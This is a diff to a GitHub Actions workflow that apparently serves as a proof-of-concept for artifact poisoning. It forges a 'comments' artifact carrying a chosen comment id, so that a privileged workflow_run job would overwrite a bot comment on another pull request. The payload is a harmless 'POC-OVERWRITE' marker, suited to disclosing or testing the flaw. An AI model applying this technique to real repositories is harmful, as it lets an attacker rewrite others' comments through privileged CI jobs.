@@ -10,9 +10,10 @@ jobs:
   code_formatter:
     runs-on: ubuntu-24.04
     steps:
-      - name: Forge artifact (attacker controls contents)
+      - name: Forge artifact (overwrite an existing bot comment on another PR)
         run: |
-          printf '%s' '[{"body":"POC-CONFIRMED: attacker-controlled comment posted by the privileged workflow_run job"}]' > comments
+          printf '%s' '["{\"id\":6531592915,\"body\":\"POC-OVERWRITE: attacker rewrote a bot comment on another PR\"}"]' > /dev/null
+          printf '%s' '[{"id":6531592915,"body":"POC-OVERWRITE: attacker rewrote a github-actions[bot] comment on another PR"}]' > comments
       - uses: actions/upload-artifact@v4
         with:
           name: workflow-args
